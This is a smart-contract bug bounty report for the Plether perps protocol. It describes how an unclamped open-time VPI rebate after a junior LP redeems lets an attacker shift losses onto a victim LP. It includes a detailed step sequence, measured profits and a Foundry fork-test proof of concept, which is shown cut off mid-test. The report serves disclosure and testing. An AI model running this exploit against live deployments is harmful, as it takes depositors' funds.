# \#98035 [SC-Critical] Unclamped open rebate after a depth collapse takes the remaining junior's USDC

**Submitted on Nov 4th 2026 at 14:09:45 UTC by @Omisanin0 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98035
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

An open pays VPI as the change in `k * S^2 / (2D)` at the depth of that trade. A close clamps the result so one position cannot finish with negative lifetime VPI. The open path does not. After the junior who funded a cap short redeems, the pool is the victim's principal and the same skew is worth more on the curve than the pool was ever paid. The offsetting open calls `HousePool.payOut` for that larger amount and, in the same transaction, locks the USDC as the new position's negative-VPI reserve. The trader cannot withdraw it. The next LP epoch writes the missing cash onto `juniorPrincipal` and then mints a deposit that was already queued. The flat close returns the reserve as revenue, and the new shares take most of it. At the `PletherOracle` storage default of 2,000 bps, the victim deposited 1,000,000 USDC and was paid 975,450.691342 USDC. The attacker's wallets finished 22,354.778301 USDC ahead. That profit is this 2,000 bps run. The release oracle constructor sets 2,500 bps, and on this long print that shift leaves a 13.685965 USDC gap, still far below the 27,858.175875 USDC rebate. The mark stayed at the cap, and the short filled at the cap, so its max profit is 0. The long open filled at 199,997,167 because the neutral basket is clamped to the cap before the stored 2,000 bps shift. While that long was open the terminal delta was the resulting 10.949545 USDC, and the attacker's close paid it. The final terminal delta is 0.

## Vulnerability Details

The launch factor is `vpiFactor` `0.01e18`. `CfdMath.tryCalculateVPI` is the difference of the integer potential at the current pool depth. `OpenAccountingLib.tryBuildOpenState` stores that difference as `vpiAssets` and sets `tradeCostAssets` to VPI plus the 4 bps execution fee. There is no comparison with VPI already collected, and no lifetime floor. `CfdEnginePlanLib` copies a negative trade cost into `poolRebatePayoutAssets`.

`CloseAccountingLib.buildCloseState` does have the floor. After the fresh curve delta it runs:

```solidity
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

The comment above that check names the sandwich it is there to stop: open at high depth, pull the depth out, then close and take a rebate larger than the VPI that position paid. `SECURITY.md` says the same clamp "intentionally zeroes otherwise extractable rebate-only round trips," and it describes the clamp on voluntary closes. The whitepaper, section 5.1, says changing depth breaks the telescope "and the position lifetime clamp can truncate close rebates." A new close-time rebate is also limited to pool cash that is free of trader claims. Whatever does not fit is waived.

The 15 October 2026 scan, "Temporary pool-liquidity reduction can amplify a skew-reducing close rebate," covers a close. That close is capped by the lifetime clamp and paid from free cash. This report is the open. The open has no lifetime clamp, the USDC is locked and later returned, and the loss is the junior principal written down before the queued deposit mints.

The open that reduces the skew is a different call. `CfdEngineSettlementSidecar.executeOpen` pays `poolRebatePayoutAssets` with `HousePool.payOut` before it locks the reserve. `payOut` subtracts `accountedAssets` and transfers the same raw USDC. It does not read `getSettlementFreeAssets`, and it does not waive a remainder. The following lines credit the negative trade cost and call `lockVpiRebateReserve` for the increase in `max(-vpiAccrued, 0)`. On this run the locked reserve equalled the USDC that had just left the pool, 27,858.175875. `consumeVpiRebateReserve` is documented as returning that backing "to the LP pool as cash recovery." The offset trader's free balance after the open does not include it.

The skew short is what makes the curve jump. It is filled at the cap, so `calculateExactMaxProfit` is 0 and the withdrawal snapshot reserves no side max for it. The test requires `entry price == 200,000,000` and `max profit == 0`, and it stops if either check fails. The fill was 20,003 lots. Lifetime VPI on that short was +8,000.800019 USDC, which is the charge at the deep pool. The attacker then redeemed the 9,000,000 USDC junior that had been in for that charge. After the redeem, junior principal was 1,001,800.793838 USDC and pool cash was 1,002,800.817858 USDC. The victim's shares were still there. Terminal delta was 0.

A skew-reducing open is still admitted when the post-trade skew is above 40% of the new depth. `CfdEnginePlanLib` rejects `SKEW_TOO_HIGH` only when the post skew is above the cap and the order fails to reduce the imbalance, or when the order's own side would be the heavy side. The long in this run reduces the short. It filled 3,865 lots at 199,997,167. The mark on that fill is the cap. The 2,833 unit gap is the storage default of 2,000 bps on the signed USDC print, applied after the cap clamp, and it is 10.949545 USDC of terminal delta. The basket confidence on that print is 14,167. `ArbitrumSepoliaReleaseOracle` and `DEPLOYMENT.md` set the release oracle to 2,500 bps. This run deploys `new PletherOracle` and keeps 2,000. At 2,500 the same confidence shifts by 3,541, and 3,865 lots make a gap of 13.685965 USDC, still far below the rebate. Because `D` had fallen from about 10,000,000 USDC to about 1,000,000 USDC, `C(S)` at the pre-trade skew was larger than the 8,000.800019 USDC the pool had collected. The rebate was 27,858.175875 USDC. The test requires the rebate to exceed that collected VPI, the reserve to equal `-vpiAccrued`, and the open terminal delta to equal that confidence gap. The gap is smaller than the excess rebate.

`HousePool._settleLpEpoch` calls `_reconcile` before it prices deposits. `_reconcile` builds the snapshot from physical assets and the signed terminal delta. On that settlement the signed terminal delta is the 10.949545 USDC confidence gap, and that amount is added to the snapshot. The rebate USDC is no longer in the pool, and the clearinghouse reserve is not an asset of that snapshot. The loss is the rebate cash that left the pool. `absorbLoss` subtracts the remaining shortfall from `juniorPrincipal` first. The deposit phase then sets `pricingAssets` to that written-down principal and mints. The 10,000,000 USDC deposit had been requested in the previous hour, so it was already in the vault when the rebate was paid. The epoch that absorbed the hole is the epoch that minted it. After the mint, `juniorPrincipal - 10,000,000 USDC` was below the principal from before the rebate. The test checks that.

The close is the attacker's. Adverse-up pricing clamps it back to the cap, so the offset trader pays the 10.949545 USDC gap from margin and the terminal delta returns to 0. The close is priced after the mint, at 10,974,942.641983 USDC of depth. Reversing the 3,865 lots at the cap costs 2,545.525195 USDC on the raw curve. Accrued VPI is −27,858.175875, the lifetime sum is −25,312.650680, and `CloseAccountingLib` raises the charge to the full accrued amount. `consumeVpiRebateReserve` sends the 27,858.175875 USDC back to the pool. The next epochs share that revenue across the post-mint supply. The victim's old shares are the small part. The attacker's new shares are the large part.

If nobody minted between the payout and the close, the returned USDC would belong to the junior who funded the reserve. The loss exists because the epoch prices a locked, attacker-triggered recovery as a realized loss and then sells the shares.

Immunefi #97677 is the case where an uncollected positive terminal delta is added to junior principal and a redeem pays it from cash. This run's absorbing settlement prints terminal delta 10.949545 USDC, and the close collects that amount from the attacker's margin. The final snapshot, after both juniors have exited, is 0. The victim shortfall is larger than the 8,000.800019 USDC of collected VPI plus that gap. The short is never closed. Its max profit stays 0, so the payout is not a close spending a live max-profit reserve. A change that keeps an uncollected price receivable out of redemption cash does not touch `payOut` on an open, and it does not stop this mint.

## Impact Details

Impact: Direct theft of any user funds, whether at rest or in motion, other than unclaimed yield. Critical.

The victim's shares are burned. The vault pays them less USDC than they deposited. The shortfall is principal. It is larger than the 8,000.800019 USDC of VPI the skew open paid the pool, so the payment is not that charge being handed back.

The run uses the launch parameters: `vpiFactor` `0.01e18`, `maxSkewRatio` `0.4e18`, initial margin 20 bps, maintenance 10 bps, carry 500 bps, bounty 10 bps, execution fee 4 bps, cap `2e8`, frozen close spread 50 bps, senior cap 40,000,000 USDC and max senior share 80%, set through the 72 hour HousePool timelock. The victim deposits 1,000,000 USDC of junior. The attacker deposits 9,000,000 USDC of junior, later 10,000,000 USDC, and 200,000 USDC of margin on each of two trader accounts. Settlement token is native USDC (6 decimals). At 1 USDC = $1, the figures below are the dollar amounts. Perps is not on mainnet, so this is the measured loss for this position. The 1,000 USDC junior seed and the 1,000 USDC senior seed stay with the deploying account. They are not in the attacker total.

| Account | Deposited (USDC) | Received (USDC) | Difference (USDC) |
|---|---:|---:|---:|
| Victim junior | 1,000,000.000000 | 975,450.691342 | -24,549.308658 |
| Attacker, all wallets | 19,400,000.000000 | 19,422,354.778301 | +22,354.778301 |

The attacker total is the 9,000,000 USDC junior, the 10,000,000 USDC deposit, both 200,000 USDC margin deposits, the USDC those wallets held at the end, and the short's remaining clearinghouse balance. The short is still open. Its margin is counted, so the profit is not abandoned collateral. The first junior redeem returned 9,007,199.982161 USDC. The dip redeem returned 10,025,387.039154 USDC. After both exits the pool still held 1,975.494736 USDC, of which 975.446619 USDC remained as junior principal.

The cash at risk on this position is the victim's 24,549.308658 USDC. The attacker needs 19,400,000 USDC of their own USDC to run it. There is no flash loan. The profit is 22,354.778301 USDC. Gas for the Foundry path was 18,128,590. On Arbitrum that is dust next to the profit.

The open has no lifetime clamp and `payOut` has no free-cash waiver, so the rebate can grow with `1/D` after the redeem, up to the cash the post-open solvency check still allows. This measurement is one size, with the offset taken at four fifths of the quoted maximum. A smaller remaining junior against the same pre-collapse skew pays a larger fraction of that junior.

## References

- `packages/perps/src/libraries/OpenAccountingLib.sol`: `tryBuildOpenState` (line 127) sets `vpiAssets` from `tryCalculateVPI` and `tradeCostAssets` from VPI plus the execution fee. No lifetime clamp.
- `packages/perps/src/libraries/CloseAccountingLib.sol`: lifetime clamp (line 112). The comment names the high-depth, collapse, close sandwich.
- `packages/perps/src/libraries/CfdEnginePlanLib.sol`: `poolRebatePayoutAssets` (line 333). Skew-reducing open exception (line 474).
- `packages/perps/src/CfdEngineSettlementSidecar.sol`: `executeOpen` pays the pool rebate (line 442) and locks the reserve increase (line 466).
- `packages/perps/src/HousePool.sol`: `payOut` (line 604) subtracts `accountedAssets` and transfers the token. `_settleLpEpoch` reconciles (line 835) before the junior deposit phase prices off `juniorPrincipal` (line 914).
- `packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol`: `absorbLoss` (line 167) takes junior principal first.
- `packages/perps/src/MarginClearinghouse.sol`: `consumeVpiRebateReserve` (line 883) returns the reserve to the pool.
- `packages/perps/WHITEPAPER.md` section 5.1, lines 863 to 888. Depth changes break the telescope. The lifetime clamp truncates close rebates. A close-time rebate that does not fit in free cash is waived. The reserve is excluded from the terminal curve.
- `packages/perps/SECURITY.md` lines 1441 to 1443. The lifetime clamp is stated for voluntary closes.
- `packages/perps/ACCOUNTING_SPEC.md` lines 821 to 822 and 1061 to 1063. The reserve cannot be withdrawn before the obligation settles. A new close-time rebate uses only cash left after trader claims.
- `packages/perps/src/OrderRouter.sol`: `commitOrder` (line 85), `executeOrder` (line 240), `settleLpEpoch` (line 479). The settlement calls are permissionless.
- `packages/perps/DEPLOYMENT.md`, launch parameters used for the economics above.
- Source pin `a82d4fefb02768e5b3bddcc97dee371eee24fea8`.

## Proof of Concept

## Proof of Concept

Run from the repository root of `immunefi-team/audit-comp-plether` at pin `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, the directory that contains `foundry.toml` (solc 0.8.35, via-IR, optimizer runs 200). Forge on this machine is 1.5.1. No private key, API key, or Pyth secret is required. If `ARBITRUM_RPC_URL` is unset, or if it is not Arbitrum One, the test forks `https://arbitrum.publicnode.com` at the latest block. The run below set that variable to `https://arb1.arbitrum.io/rpc`.

Save the Solidity below as `test/fork/F700RealPythFork.t.sol`. Save the JSON below as `test/fixtures/f700/usdc-prints.json`. `foundry.toml` already allows reads under `test/fixtures/`.

```bash
ARBITRUM_RPC_URL=https://arb1.arbitrum.io/rpc forge test --match-path test/fork/F700RealPythFork.t.sol --match-contract F700RealPythFork -vv
```

One run forked Arbitrum One at the latest block and printed chain id 42161, block 26341668, timestamp 1793797976. The test does not pin that block. Settlement token is native USDC `0xaf88d065e77c8cC2239327C5EDb3A432268e5831`, credited with Foundry `deal`. `setUp` deploys the pin source with `new CfdEngine`, `new HousePool`, `new PletherOracle`, `new OrderRouter`, and the other contracts. No in-scope file is edited.

There is no `MockPyth` and no `MockSettlementToken`. The oracle has one feed, quantity `1e18`, base `49,987,114`, inversion false. That base is set once, before any trade, so each signed neutral basket lands on or above the cap. The JSON is seven unmodified Ethereum mainnet `updatePriceFeeds(bytes[])` payloads for Crypto.USDC/USD `0xeaa020c61cc479712813461ce153894a96a6c00b21ed0cfc2798d1f9a9e9c94a`. Arbitrum One Pyth `0xff1a0f4744e8582DF1aE09D5611b887B6a12925C` verifies them. Foundry has no ArbSys precompile, so the test etches the repo's `ForkArbSys` stub at address 100. That stub returns `block.number` and is not a protocol contract. `F700RealPythClock` only reads the stored commit time, so a warp cannot make via-IR substitute `block.timestamp`.

The fork clock is moved backward once, before deployment, to 2026-11-01 04:49:59 UTC, then only forward through the signed publish times on Wednesday 2026-11-04. Each `prevPublishTime` is one second before its `publishTime`, inside the 15 second unique window. Every order goes through `router.commitOrder` and `router.executeOrder`. Every LP settlement goes through `router.settleLpEpoch`. The Pyth fee is read from the live contract. On this run it was 0.

Steps:

1. Set the launch risk parameters. Propose senior cap 40,000,000 USDC and max senior share 80%. Warp forward across the 72 hour timelock and finalize. Seed 1,000 USDC of junior and 1,000 USDC of senior, both to the deploying account. Activate trading at 2026-11-04 04:50:00 UTC. The test checks that the execution fee is 4 bps, that the adverse-confidence multiplier is the stored default of 2,000 bps, that the unique window is 15 seconds, and that the senior cap and share match the launch values. The release constructor sets the multiplier to 2,500 bps. This deployment does not.
2. The victim `requestDeposit`s 1,000,000 USDC. The attacker `requestDeposit`s 9,000,000 USDC. Both requests land in the 05:00 epoch. `router.settleLpEpoch` uses the signed 05:17:26 UTC print (price 99,985,354, confidence 10,339, transaction `0xe96649e4de9790fca5dbbe64f93720ecad3ad6c6abbc6386235e96ccbb11b00a`). The mark clamps to the cap. Both deposits are claimed.
3. Two trader accounts each deposit 200,000 USDC into the clearinghouse. The skew account opens a short through `router.commitOrder` and `router.executeOrder` on the signed 05:52:06 UTC print (price 99,989,699, confidence 5,193, transaction `0x5ba2425da6e0083f2ad63bf047127ccfffcbf7f5c3cba2592b98aa192d78230c`). The size is the lens quote minus one lot, 20,003 lots, with 100,000 USDC of margin and target price equal to the cap. Entry price is 200,000,000. Max profit is 0. VPI accrued is +8,000.800019 USDC.
4. After the one hour deposit cooldown, the attacker junior redeems its full balance into the 07:00 epoch. `router.settleLpEpoch` uses the signed 07:27:49 UTC print (price 99,978,133, confidence 4,428, transaction `0x2e36baf25ccb32308bf02ae166ccdb6277d257ddec895e5ca435da64b1321053`). The victim's shares stay. Terminal delta is 0. Pool cash is 1,002,800.817858 USDC. Junior principal is 1,001,800.793838 USDC. The attacker receives 9,007,199.982161 USDC.
5. The attacker `requestDeposit`s 10,000,000 USDC into the 08:00 epoch and does not settle it.
6. The offset account opens a long through the same router path on the signed 07:58:27 UTC print (price 99,979,830, confidence 7,082, transaction `0xfaecdc452e81a39f6061f81c81965ae4cff3ea9e3ecc3663ee76f7b00ba6d9db`). The size is four fifths of the quote, rounded down to a lot, 3,865 lots, with 100,000 USDC of margin and a target price of 1. The mark clamps to the cap. The fill is 199,997,167, the cap minus the adverse shift. Pool cash falls by 27,858.175875 USDC. `vpiRebateReserveAssets` on that account is 27,858.175875 USDC. Terminal delta is 10.949545 USDC, equal to 3,865 lots times the 2,833 unit gap.
7. At the dip epoch, `router.settleLpEpoch` uses the signed 08:28:39 UTC print (price 99,980,957, confidence 4,993, transaction `0x54368d6e52539c289e22887f9a568494f33af6a0a0d38c5d0883c0d665d6fdfa`). The mark is the cap. The attacker claims the 10,000,000 USDC deposit. Junior principal minus that deposit is below the principal from before the rebate.
8. The offset account closes the whole long on the signed 08:59:16 UTC print (price 99,977,002, confidence 4,334, transaction `0xdc678346ae651cd73055ac8f8dbaf42a0e111853f8b71bd1c81833dc27df0dae`). The close price clamps to the cap. The raw curve charge at the post-mint depth is 2,545.525195 USDC, and the lifetime clamp raises it to the accrued rebate. Position size is 0. The reserve is 0. Terminal delta is 0. The returned reserve is back in the pool, and the 10.949545 USDC gap has been paid from the offset trader's margin.
9. Both juniors request redemption into the 10:00 epoch. `router.settleLpEpoch` uses the signed 10:06:08 UTC print (price 99,976,668, confidence 12,200, transaction `0xfe5e089bab064c38677e6a905a980d2eed6ee188533adb1bce88618000027e9a`). The victim receives 975,450.691342 USDC, with zero shares left. The attacker receives 10,025,387.039154 USDC for the dip. Both traders withdraw free margin. The short's remaining clearinghouse balance stays in the attacker total. The final terminal delta is 0.

The test checks the cap short, the zero max profit, the rebate above collected VPI, the locked reserve, the confidence gap, the principal write-down, the returned reserve, a final terminal delta of 0, a victim shortfall larger than collected VPI plus the confidence gap, and a positive attacker profit.

```text
fork chain id 42161
fork block 26341668
fork timestamp 1793797976
settlement token 0xaf88d065e77c8cC2239327C5EDb3A432268e5831
pyth 0xff1a0f4744e8582DF1aE09D5611b887B6a12925C
oracle base price 49987114
trading active at 1793767800
step 3 skew entry price 200000000
step 3 skew max profit atoms 0
step 3 skew VPI atoms 8000800019
step 4 pool USDC atoms 1002800817858
step 4 junior principal atoms 1001800793838
step 4 attacker USDC out atoms 9007199982161
step 6 offset entry price 199997167
step 6 rebate atoms 27858175875
step 6 locked reserve atoms 27858175875
step 6 terminal delta atoms 10949545
step 6 adverse confidence gap atoms 10949545
step 8 offset size left 0
step 8 reserve left atoms 0
step 9 victim economic atoms 975450691342
step 9 attacker in atoms 19400000000000
step 9 attacker out atoms 19422354778301
step 9 terminal delta atoms 0
victim loss atoms 24549308658
victim loss whole USDC 24549
attacker profit atoms 22354778301
attacker profit whole USDC 22354
funds at risk atoms 24549308658
```

`[PASS]` `test_openRebateAfterDepthCollapsePaysTheQueuedJunior`, gas 18,128,590.

Full test, `test/fork/F700RealPythFork.t.sol`:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {CfdEngineAdmin} from "@plether/perps/CfdEngineAdmin.sol";
import {CfdEngineLens} from "@plether/perps/CfdEngineLens.sol";
import {CfdEnginePlanner} from "@plether/perps/CfdEnginePlanner.sol";
import {CfdEngineSettlementSidecar} from "@plether/perps/CfdEngineSettlementSidecar.sol";
import {CfdOrderPolicyEvaluator} from "@plether/perps/CfdOrderPolicyEvaluator.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {HousePool} from "@plether/perps/HousePool.sol";
import {HousePoolRedemptionMathSidecar} from "@plether/perps/HousePoolRedemptionMathSidecar.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {OrderLifecycleBook} from "@plether/perps/OrderLifecycleBook.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderRouterExecutionSidecar} from "@plether/perps/OrderRouterExecutionSidecar.sol";
import {OrderRouterLiquidationBatchSidecar} from "@plether/perps/OrderRouterLiquidationBatchSidecar.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {TerminalNavBookV2} from "@plether/perps/TerminalNavBookV2.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {ICfdEngineLens} from "@plether/perps/interfaces/ICfdEngineLens.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {ForkArbSys} from "@plether/test-utils/ArbitrumForkSupport.sol";
import {console2} from "forge-std/console2.sol";
import {Test} from "forge-std/Test.sol";

/// @title F-700: open rebate after a depth collapse, priced by real Pyth
///
/// @notice Local Arbitrum One fork of the latest block. Deploys the in-repo perps source. Nothing is
///         broadcast. Do not point this test at a public testnet or at mainnet.
///
///         Run from the repository root, the directory that contains `foundry.toml`
///         (solc 0.8.35, via_ir, optimizer_runs 200):
///
///             ARBITRUM_RPC_URL=https://arb1.arbitrum.io/rpc forge test --match-path test/fork/F700RealPythFork.t.sol --match-contract F700RealPythFork -vv
///
///         Dependencies: Foundry, the remappings in `foundry.toml`, and the committed signed Pyth
///         payloads in `test/fixtures/f700/usdc-prints.json`. Optional env: `ARBITRUM_RPC_URL`. If it
///         is unset, or if it is not Arbitrum One, the test forks `https://arbitrum.publicnode.com`.
///         No token key and no Pyth API key. The Pyth fee is read from the live contract and printed.
///
///         Collateral is Arbitrum One native USDC (`0xaf88d065e77c8cC2239327C5EDb3A432268e5831`),
///         credited with Foundry `deal`. There is no MockSettlementToken, no MockPyth, and no engine or
///         router prank. Deposits, redeems, opens, the close, marks, and LP settlement go through
///         `TrancheVault`, `MarginClearinghouse`, and `OrderRouter.commitOrder`, `executeOrder`, and
///         `settleLpEpoch`.
///
///         Prices are the unmodified `updatePriceFeeds(bytes[])` payloads of seven public Ethereum
///         mainnet transactions for Crypto.USDC/USD
///         `0xeaa020c61cc479712813461ce153894a96a6c00b21ed0cfc2798d1f9a9e9c94a`, captured on 2026-11-04.
///         Arbitrum One Pyth `0xff1a0f4744e8582DF1aE09D5611b887B6a12925C` verifies them. Each print's
///         `prevPublishTime` is one second before its `publishTime`, inside the 15 second unique window.
///         The oracle base is the owner's basket divisor, chosen once at deployment so every one of these
///         real prints has a neutral basket on or above `CAP_PRICE`. `PletherOracle` clamps that neutral
///         price to the cap before the stored 2_000 bps adverse-confidence default. Marks, the short open, and the
///         long close therefore clamp to the cap. The long open is shifted down and fills at
///         `CAP_PRICE - shift`. That gap is unrealized while the long is open and is paid by the attacker's
///         own offset trader when the long closes, so the final terminal price delta is zero. The signed
///         bytes are not edited and the base is not changed between trades.
///
///         `ForkArbSys` is etched at address 100 because Foundry has no ArbSys precompile. It returns
///         `block.number` and is not a protocol contract.
///
///         The fork clock is moved backward once, before deployment, so the test can walk forward through
///         the signed publish times. That warp is local. No transaction is sent to the network.
contract F700RealPythClock {

    /// @notice The order record's commit time. An external return so via-IR cannot rewrite it to a
    ///         fresh `block.timestamp` after `vm.warp`.
    function storedCommitTime(OrderRouter router, uint64 orderId) external view returns (uint256 commitTime) {
        (IOrderRouterAccounting.PendingOrderView memory pending,) = router.getPendingOrderView(orderId);
        commitTime = uint256(pending.commitTime);
    }

}

contract F700RealPythFork is Test {

    using SafeERC20 for IERC20;

    address internal constant USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
    address internal constant PYTH = 0xff1a0f4744e8582DF1aE09D5611b887B6a12925C;
    bytes32 internal constant USDC_USD = 0xeaa020c61cc479712813461ce153894a96a6c00b21ed0cfc2798d1f9a9e9c94a;
    uint256 internal constant CAP_PRICE = 2e8;
    /// @dev Largest base at which all seven signed prints still satisfy
    ///      `weighted - shift >= CAP_PRICE`, with `shift` the stored 2_000 bps adverse-confidence default.
    ///      The final print lands on the cap exactly. Every earlier print lands above it and clamps.
    uint256 internal constant BASE_PRICE = 49_987_114;
    uint256 internal constant LOT = 1e20;
    uint256 internal constant VICTIM_DEPOSIT = 1_000_000e6;
    uint256 internal constant ATTACKER_DEPOSIT = 9_000_000e6;
    uint256 internal constant DIP_DEPOSIT = 10_000_000e6;
    uint256 internal constant TRADER_FUND = 200_000e6;
    uint256 internal constant ORDER_MARGIN = 100_000e6;
    uint256 internal constant SEED = 1_000e6;

    /// @dev 2026-11-04 04:50:00 UTC. Before the 04:55 cutoff, so both deposits enter the 05:00 epoch.
    uint256 internal constant REQUEST_TIME = 1_793_767_800;
    uint256 internal constant DEPOSIT_EPOCH = 1_793_768_400;
    uint256 internal constant DEPOSIT_PUBLISH = 1_793_769_446;
    uint256 internal constant SHORT_PREV = 1_793_771_525;
    uint256 internal constant SHORT_PUBLISH = 1_793_771_526;
    uint256 internal constant REDEEM_EPOCH = 1_793_775_600;
    uint256 internal constant REDEEM_PUBLISH = 1_793_777_269;
    uint256 internal constant LONG_PREV = 1_793_779_106;
    uint256 internal constant LONG_PUBLISH = 1_793_779_107;
    uint256 internal constant DIP_EPOCH = 1_793_779_200;
    uint256 internal constant DIP_PUBLISH = 1_793_780_919;
    uint256 internal constant CLOSE_PREV = 1_793_782_755;
    uint256 internal constant CLOSE_PUBLISH = 1_793_782_756;
    uint256 internal constant FINAL_EPOCH = 1_793_786_400;
    uint256 internal constant FINAL_PUBLISH = 1_793_786_768;

    string internal constant FIXTURE = "test/fixtures/f700/usdc-prints.json";

    MarginClearinghouse internal clearinghouse;
    CfdEngine internal engine;
    HousePool internal pool;
    TrancheVault internal juniorVault;
    PletherOracle internal oracle;
    OrderRouter internal router;
    CfdEngineLens internal lens;
    F700RealPythClock internal clock;

    address internal victim = makeAddr("f700-victim");
    address internal attacker = makeAddr("f700-attacker");
    address internal skewTrader = makeAddr("f700-skew");
    address internal offsetTrader = makeAddr("f700-offset");

    function setUp() public {
        _requireBaseClampsCap();
        _forkArbitrumOne();
        vm.etch(address(100), type(ForkArbSys).runtimeCode);
        require(block.chainid == 42_161, "Arbitrum One fork required");
        require(PYTH.code.length > 0, "Arbitrum One Pyth has no code");
        console2.log("fork chain id", block.chainid);
        console2.log("fork block", block.number);
        console2.log("fork timestamp", block.timestamp);
        console2.log("settlement token", USDC);
        console2.log("pyth", PYTH);
        console2.log("usdc usd feed");
        console2.logBytes32(USDC_USD);

        // Local clock only. Deployment then walks forward through the signed publish times.
        vm.warp(REQUEST_TIME - 72 hours - 1);
        vm.roll(block.number + 1);

        CfdTypes.RiskParams memory params = CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });

        clearinghouse = new MarginClearinghouse(USDC);
        engine = new CfdEngine(USDC, address(clearinghouse), CAP_PRICE, params, 50);
        engine.setDependencies(
            address(new CfdEnginePlanner()),
            address(new CfdEngineSettlementSidecar(address(engine))),
            address(new CfdEngineAdmin(address(engine), address(this)))
        );
        engine.setTerminalNavBook(address(new TerminalNavBookV2(address(engine), uint32(CAP_PRICE))));
        pool = new HousePool(USDC, address(engine), address(new HousePoolRedemptionMathSidecar()));
        TrancheVault seniorVault =
            new TrancheVault(IERC20(USDC), address(pool), true, "Senior LP", "senAssets", 0, address(0));
        juniorVault = new TrancheVault(IERC20(USDC), address(pool), false, "Junior LP", "junAssets", 0, address(0));
        pool.setSeniorVault(address(seniorVault));
        pool.setJuniorVault(address(juniorVault));
        engine.setPool(address(pool));

        bytes32[] memory feedIds = new bytes32[](1);
        feedIds[0] = USDC_USD;
        uint256[] memory quantities = new uint256[](1);
        quantities[0] = 1e18;
        uint256[] memory basePrices = new uint256[](1);
        basePrices[0] = BASE_PRICE;
        oracle = new PletherOracle(address(engine), address(pool), PYTH, feedIds, quantities, basePrices, new bool[](1));
        lens = new CfdEngineLens(address(engine));
        CfdOrderPolicyEvaluator evaluator = new CfdOrderPolicyEvaluator();
        OrderRouterExecutionSidecar executionSidecar = new OrderRouterExecutionSidecar();
        uint64 nonce = vm.getNonce(address(this));
        address predictedRouter = vm.computeCreateAddress(address(this), nonce + 2);
        OrderLifecycleBook lifecycleBook =
            new OrderLifecycleBook(predictedRouter, address(engine), address(clearinghouse), address(pool));
        OrderRouterLiquidationBatchSidecar keeperSidecar = new OrderRouterLiquidationBatchSidecar(predictedRouter);
        router = new OrderRouter(
            address(engine),
            address(lens),
            address(pool),
            address(oracle),
            address(keeperSidecar),
            address(evaluator),
            address(executionSidecar),
            address(lifecycleBook)
        );
        require(address(router) == predictedRouter, "router address prediction failed");
        engine.setOrderRouter(address(router));
        clearinghouse.setEngine(address(engine));
        clock = new F700RealPythClock();

        pool.proposePoolConfig(
            IHousePool.PoolConfig({
                seniorRateBps: pool.seniorRateBps(),
                markStalenessLimit: pool.markStalenessLimit(),
                seniorFrozenLpFeeBps: pool.seniorFrozenLpFeeBps(),
                juniorFrozenLpFeeBps: pool.juniorFrozenLpFeeBps(),
                maxSeniorExposureAssets: 40_000_000e6,
                maxSeniorShareBps: 8_000
            })
        );
        _advanceTo(REQUEST_TIME);
        pool.finalizePoolConfig();
        require(!engine.isOracleFrozen(), "request timestamp is inside the frozen window");
        require(!engine.isFadWindow(), "request timestamp is inside the FAD window");
        require(engine.executionFeeBps() == 4, "execution fee is not the 4 bps launch value");
        require(pool.maxSeniorExposureAssets() == 40_000_000e6, "senior cap is not the launch value");
        require(pool.maxSeniorShareBps() == 8_000, "senior share is not the launch value");
        require(oracle.adverseConfidenceMultiplierBps() == 2_000, "adverse confidence multiplier moved");
        require(oracle.orderSettlementWindow() == 15, "unique window is not 15 seconds");

        _credit(address(this), SEED * 2);
        IERC20(USDC).forceApprove(address(pool), SEED * 2);
        pool.initializeSeedPosition(false, SEED, address(this));
        pool.initializeSeedPosition(true, SEED, address(this));
        pool.activateTrading();
        console2.log("trading active at", block.timestamp);
        console2.log("launch vpi wad", params.vpiFactor);
        console2.log("oracle base price", BASE_PRICE);
        console2.log("seed junior and senior atoms, each", SEED);
    }

    function test_openRebateAfterDepthCollapsePaysTheQueuedJunior() public {
        console2.log("step 1 victim junior atoms", VICTIM_DEPOSIT);
        console2.log("step 1 attacker junior atoms", ATTACKER_DEPOSIT);
        uint256 victimRequest = _requestDeposit(victim, VICTIM_DEPOSIT);
        uint256 attackerRequest = _requestDeposit(attacker, ATTACKER_DEPOSIT);
        require(pool.lpEpochStart(victimRequest) == DEPOSIT_EPOCH, "victim deposit epoch moved");
        require(pool.lpEpochStart(attackerRequest) == DEPOSIT_EPOCH, "attacker deposit epoch moved");
        console2.log("step 1 shared deposit epoch", DEPOSIT_EPOCH);
        _logPrint("step 1 settle signed print", "deposit");
        _advanceTo(DEPOSIT_PUBLISH);
        _settle("deposit", DEPOSIT_PUBLISH);
        _claimDeposit(victim, victimRequest, VICTIM_DEPOSIT);
        _claimDeposit(attacker, attackerRequest, ATTACKER_DEPOSIT);
        console2.log("step 1 victim shares", juniorVault.balanceOf(victim));
        console2.log("step 1 attacker shares", juniorVault.balanceOf(attacker));
        console2.log("step 1 pool USDC atoms", pool.totalAssets());
